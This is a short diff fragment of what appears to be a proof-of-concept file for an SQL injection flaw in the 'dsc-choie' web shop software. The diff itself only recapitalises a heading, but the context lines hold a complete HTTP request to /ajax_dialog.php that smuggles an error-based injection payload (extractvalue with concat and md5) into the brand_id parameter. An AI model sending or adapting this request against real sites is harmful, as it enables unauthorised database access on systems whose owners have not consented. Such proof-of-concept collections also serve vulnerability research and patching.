@@ -8,7 +8,7 @@
 body="dsc-choie"
 ```
 
-## poc
+## POC
 
 ```javascript
 GETT /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=extractvalue(1,concat(0x7e,md5(123)))&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
